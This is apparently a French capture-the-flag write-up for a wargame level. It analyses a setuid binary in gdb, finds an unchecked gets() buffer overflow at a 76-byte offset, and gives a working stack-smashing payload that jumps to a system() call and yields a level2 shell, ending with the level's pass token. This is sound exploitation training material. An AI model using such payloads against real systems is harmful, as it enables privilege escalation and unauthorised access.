## Démarche
<!-- - La commande `readelf -r level1` nous donne des informations à propos du programme elf `level1` :
  
    ```
    Relocation section '.rel.dyn' at offset 0x2c0 contains 2 entries:
    Offset     Info    Type            Sym.Value  Sym. Name
    08049788  00000406 R_386_GLOB_DAT    00000000   __gmon_start__
    080497c0  00000605 R_386_COPY        080497c0   stdout

    Relocation section '.rel.plt' at offset 0x2d0 contains 5 entries:
    Offset     Info    Type            Sym.Value  Sym. Name
    08049798  00000107 R_386_JUMP_SLOT   00000000   gets
    0804979c  00000207 R_386_JUMP_SLOT   00000000   fwrite
    080497a0  00000307 R_386_JUMP_SLOT   00000000   system
    080497a4  00000407 R_386_JUMP_SLOT   00000000   __gmon_start__
    080497a8  00000507 R_386_JUMP_SLOT   00000000   __libc_start_main
    ``` -->

- La commande `objdump -d level1` nous permet de connaitre la constitution du programme :
  - On remarque une fonction `run` en plus du `main`:
     > 08048444 <run>:
  - Ainsi qu'un appel de `gets` dans le `main` : 
    >  8048490:	e8 ab fe ff ff       	call   8048340 <gets@plt>

    Cette fonction est déconseillée :
    `man gets`
    > SECURITY CONSIDERATIONS
     The gets() function cannot be used securely.  Because of its lack of bounds
     checking, and the inability for the calling program to reliably determine
     the length of the next incoming line, the use of this function enables mali-
     cious users to arbitrarily change a running program's functionality through
     a buffer overflow attack.  It is strongly suggested that the fgets() func-
     tion be used in all cases.  (See the FSA.)

- Dans gdb, avec peda (`source /tmp/peda/peda.py`- cf level0)
  - `disass main` :
    ```
    0x08048480 <+0>:	push   ebp
    0x08048481 <+1>:	mov    ebp,esp
    0x08048483 <+3>:	and    esp,0xfffffff0
    0x08048486 <+6>:	sub    esp,0x50
    0x08048489 <+9>:	lea    eax,[esp+0x10]
    0x0804848d <+13>:	mov    DWORD PTR [esp],eax
    0x08048490 <+16>:	call   0x8048340 <gets@plt>
    0x08048495 <+21>:	leave
    0x08048496 <+22>:	ret
     ```
  - `disass run` :
    ```
    Dump of assembler code for function run:
    0x08048444 <+0>:	push   ebp
    0x08048445 <+1>:	mov    ebp,esp
    0x08048447 <+3>:	sub    esp,0x18
    0x0804844a <+6>:	mov    eax,ds:0x80497c0
    0x0804844f <+11>:	mov    edx,eax
    0x08048451 <+13>:	mov    eax,0x8048570
    0x08048456 <+18>:	mov    DWORD PTR [esp+0xc],edx
    0x0804845a <+22>:	mov    DWORD PTR [esp+0x8],0x13
    0x08048462 <+30>:	mov    DWORD PTR [esp+0x4],0x1
    0x0804846a <+38>:	mov    DWORD PTR [esp],eax
    0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
    0x08048472 <+46>:	mov    DWORD PTR [esp],0x8048584
    0x08048479 <+53>:	call   0x8048360 <system@plt>
    0x0804847e <+58>:	leave
    0x0804847f <+59>:	ret
    End of assembler dump.
    ```

  - En lançant le debug avec un breakpoint sur le main (`br main`) puis en sautant jusqu'à l'adresse de la fonction run (`jump *0x08048444`), on obtient l'ouverture d'un shell avec les droits level1 :
    ```
    Good... Wait what?
    [New process 4468]
    process 4468 is executing new program: /bin/dash
    $ whoami
    [New process 4469]
    process 4469 is executing new program: /usr/bin/whoami
    level1
    $ [Inferior 4 (process 4469) exited normally]
    ```
    <!-- - `(python -c 'print("\xef\xbe\xad\xde")' ; cat) | ./level1` -->

  - Pour exploiter la faille de la fonction gets, trouver quelle taille permet d'overflow le buffer :
    - Créer un pattern avec la fonction `pattern create 100` de peda.
    - Lancer le programme avec le pattern sur l'entrée standard :
      
      `run < <(python -c 'print("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")')`
      On obtient bien le segfault attendu.
    - Chercher l'emplacement du pattern en mémoire avec `pattern search` :
        > EBP+0 found at offset: 72
        > 
        > [EBP] --> offset 72 - size ~28
    <!-- - Placer un breakpoint sur la fonction run avec `br run` (ceci nous donne aussi son adresse : `Breakpoint 1 at 0x804844a`) -->
    <!-- - Relancer le programme avec une chaine comportant 72 + 4 caractères puis l'adresse de run (inversée) : -->
      <!-- `r < <(python -c 'print "\x90"*76+"\x4a\x84\x04\x08"')` -->

- Dans la Vm :
  - générer une chaine de 72 + 4 (taille du pointeur) caractères suivie de l'adresse de la fonction `run` (0x08048444 inversée car système little endian) et la passer sur l'entrée standard du programme :
    `(python -c 'print "A"*76+"\x4a\x84\x04\x08"' ; cat) | ./level1`

    Un nouvel shell est exécuté avec les droits user level2 :
      ```
      Good... Wait what?
      whoami
      level2
      pwd
      /home/user/level1
      cd ../level2
      pwd
      /home/user/level2
      ls
      level2
      ls -la
      total 17
      dr-xr-x---+ 1 level2 level2   80 Mar  6  2016 .
      dr-x--x--x  1 root   root    340 Sep 23  2015 ..
      -rw-r--r--  1 level2 level2  220 Apr  3  2012 .bash_logout
      -rw-r--r--  1 level2 level2 3530 Sep 23  2015 .bashrc
      -rw-r--r--+ 1 level2 level2   65 Sep 23  2015 .pass
      -rw-r--r--  1 level2 level2  675 Apr  3  2012 .profile
      -rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2
      cat .pass
      53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
      ```

<br>
----
## Ressources

- [Return to libc attack](https://en.wikipedia.org/wiki/Return-to-libc_attack)
- [Buffer Overflow Attack](https://owasp.org/www-community/attacks/Buffer_overflow_attack)
- [Managing inputs for payload injection](https://reverseengineering.stackexchange.com/questions/13928/managing-inputs-for-payload-injection/13929#13929)
- [Check Endian system](https://serverfault.com/questions/163487/how-to-tell-if-a-linux-system-is-big-endian-or-little-endian)


<!-- - [PLT call in ELF programm](https://stackoverflow.com/questions/25667205/what-exactly-does-putsplt-mean) -->
<!-- - [RELRO - Memory Corruption Mitigation Technique](https://tk-blog.blogspot.com/2009/02/relro-not-so-well-known-memory.html) -->
<!-- - [Mémoire - protection : RELRO](https://www.root-me.org/fr/Documentation/Applicatif/Memoire-protection-RELRO) -->